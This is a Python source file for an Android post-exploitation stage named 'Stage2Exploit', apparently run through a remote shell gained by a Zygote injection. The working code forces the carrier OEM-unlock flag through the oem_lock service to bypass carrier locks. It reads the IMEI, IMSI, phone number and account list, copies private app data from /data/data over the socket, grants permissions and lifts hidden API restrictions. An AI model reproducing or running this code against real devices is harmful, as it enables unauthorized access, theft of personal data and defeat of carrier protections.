import socket

import codecs

import re

import shlex

import os

from typing import Any, Optional

from io import BytesIO

from pathlib import Path

import aidl

from .exceptions import *

from .parcel import *

from .session import RemoteShellSession

from .utils import console

def swap_endianness(bytes_: bytes) -> bytes:

    result = b""

    bytes_io = BytesIO(bytes_)

    while True:

        read_bytes = bytes_io.read(4)

        if not read_bytes:

            break

        result += read_bytes[::-1]

    return result

def parse_service_result(service_result: str) -> bytes:

    EXPRESSION = re.compile(

        r"^(?:Result\: Parcel\(|  0x[0-9a-fA-F]+: )((?:[0-9a-fA-F ])+)'[^']*'\)?$"

    )

    matched_any = False

    result = b""

    for line in service_result.split("\n"):

        matched = EXPRESSION.fullmatch(line)

        if matched is None: continue

        matched_any = True

        result += codecs.decode(matched[1].replace(" ", ""), "hex")

    if not matched_any:

        if "Result: Parcel(00000000    '....')" in service_result: return b""

        if "service call failed" in service_result or "Result: Parcel" not in service_result:

             raise ZygoteInjectionException(f"service call failed or returned unexpected output")

    return swap_endianness(result)[4:]

with open(Path(__file__).parent / "IOemLockService.aidl") as handle:

    oem_lock_service_aidl = handle.read()

oem_lock_service = parse_aidl_interface(aidl.fromstring(oem_lock_service_aidl), "IOemLockService")

known_services = {"oem_lock": oem_lock_service}

class Stage2Exploit:

    def __init__(self, session: Optional[RemoteShellSession] = None, port: int = 1234) -> None:

        self.port = port

        self.session = session

        self._owns_session = False

        if self.session is None:

             self.session = RemoteShellSession(port=self.port)

             self._owns_session = True

    def call_service(self, service_name: str, function: str, *arguments: ParcelType) -> Any:

        interface = known_services.get(service_name)

        if not interface:

            return None

        service_function = interface[function]

        parsed_arguments = service_function.parse_arguments(arguments)

        command = shlex.join(["service", "call", service_name, str(service_function.code), *parsed_arguments])

        service_result = self.session.run_command(command, timeout=5.0)

        return_value = parse_service_result(service_result)

        parsed_return_value = service_function.parse_return(return_value)

        status_code = parsed_return_value[0]

        if status_code:

            raise ZygoteInjectionException(f"service call {function} failed with {status_code}")

        return parsed_return_value[1] if len(parsed_return_value) > 1 else None

    def backup_data(self, package_name: str, output_path: str):

        console.print(f"[info]Backing up {package_name}...")

        res = self.session.run_command(f"ls -d /data/data/{package_name}")

        if "No such file" in res:

            console.print(f"[error]Package data directory not found.[/]")

            return

        tar_cmd = "tar"

        if not self.session.run_command("which tar").strip():

             if self.session.run_command("which busybox").strip():

                 tar_cmd = "busybox tar"

             else:

                 console.print("[error]'tar' not found on device.[/]")

                 return

        command = f"{tar_cmd} -cz -C /data/data {package_name}"

        self.session.send_command(command)

        original_timeout = self.session.timeout

        self.session.socket.settimeout(5.0)

        try:

            with open(output_path, "wb") as f:

                while True:

                    try:

                        chunk = self.session.socket.recv(8192)

                        if not chunk: break

                        f.write(chunk)

                    except socket.timeout: break

        except Exception as e:

            console.print(f"[error]Backup failed: {e}[/]")

        finally:

             self.session.socket.settimeout(original_timeout)

        console.print(f"[success]Backup saved to {output_path}[/]")

    def restore_data(self, package_name: str, input_path: str):

        if not os.path.exists(input_path):

            console.print(f"[error]Input file {input_path} not found.[/]")

            return

        tar_cmd = "tar"

        if not self.session.run_command("which tar").strip():

             tar_cmd = "busybox tar" if self.session.run_command("which busybox").strip() else "tar"

        self.session.run_command(f"mkdir -p /data/data/{package_name}")

        self.session.send_command(f"{tar_cmd} -xz -C /data/data/{package_name}")

        try:

            with open(input_path, "rb") as f:

                while True:

                    chunk = f.read(8192)

                    if not chunk: break

                    self.session.socket.sendall(chunk)

            self.session.socket.shutdown(socket.SHUT_WR)

            output = self.session.read_all(timeout=2.0)

            console.print("[success]Restore completed.[/]")

        except Exception as e:

            console.print(f"[error]Restore failed: {e}[/]")

    def grant_permission(self, package: str, permission: str):

        console.print(f"[info]Granting {permission} to {package}...")

        res = self.session.run_command(f"pm grant {package} {permission}")

        if res.strip():

            console.print(f"[dim]Output: {res.strip()}[/]")

        console.print("[success]Permission granted (if supported).[/]")

    def toggle_hidden_api(self, disable: bool = True):

        value = "1" if disable else "null"

        action = "Disabling" if disable else "Enabling"

        console.print(f"[info]{action} Hidden API restrictions...")

        self.session.run_command(f"settings put global hidden_api_blacklist_exemptions {'*' if disable else 'null'}")

        console.print("[success]Hidden API policy updated.[/]")

    def manage_package(self, package: str, action: str):

        cmd_map = {

            "disable": f"pm disable-user --user 0 {package}",

            "enable": f"pm enable {package}",

            "stop": f"am force-stop {package}",

            "clear": f"pm clear {package}"

        }

        if action in cmd_map:

            console.print(f"[info]Executing {action} on {package}...")

            self.session.run_command(cmd_map[action])

            console.print("[success]Done.[/]")

    def get_telephony_info(self):

        console.print("[info]Extracting Telephony Identifiers...")

        results = {}

        codes = {"IMEI": 1, "IMSI": 7, "Phone Number": 11}

        for name, code in codes.items():

            res = self.session.run_command(f"service call iphonesubinfo {code}")

            try:

                raw_hex = "".join(re.findall(r"0x[0-9a-f]{8}: ([0-9a-f ]{35})", res))

                clean_hex = raw_hex.replace(" ", "")

                decoded = bytes.fromhex(clean_hex[16:]).decode("utf-16le", errors="ignore").strip("\x00")

                if decoded: results[name] = decoded

            except: pass

        return results

    def get_accounts(self):

        console.print("[info]Fetching Account List...")

        res = self.session.run_command("dumpsys account")

        accounts = []

        matches = re.findall(r"Account \{name=(.*?), type=(.*?)\}", res)

        for name, type_ in matches:

            accounts.append({"name": name, "type": type_})

        return accounts

    def exploit_stage2(self):

        if not self.session.socket: self.session.connect()

        try:

            allowed_by_carrier = self.call_service("oem_lock", "isOemUnlockAllowedByCarrier")

            if not allowed_by_carrier:

                console.print("[warning]OEM unlock blocked by carrier. Attempting bypass...[/]")

                self.call_service("oem_lock", "setOemUnlockAllowedByCarrier", 1)

                if self.call_service("oem_lock", "isOemUnlockAllowedByCarrier"):

                    console.print("[success]Carrier lock bypassed![/]")

            if not self.call_service("oem_lock", "isOemUnlockAllowedByUser"):

                self.call_service("oem_lock", "setOemUnlockAllowedByUser", 1)

            if self.call_service("oem_lock", "isOemUnlockAllowed"):

                console.print("[success]OEM unlock is now allowed in settings.[/]")

        except Exception as e:

            console.print(f"[dim]OEM Lock service interaction skipped or failed: {e}[/]")

        if self._owns_session: self.session.close()
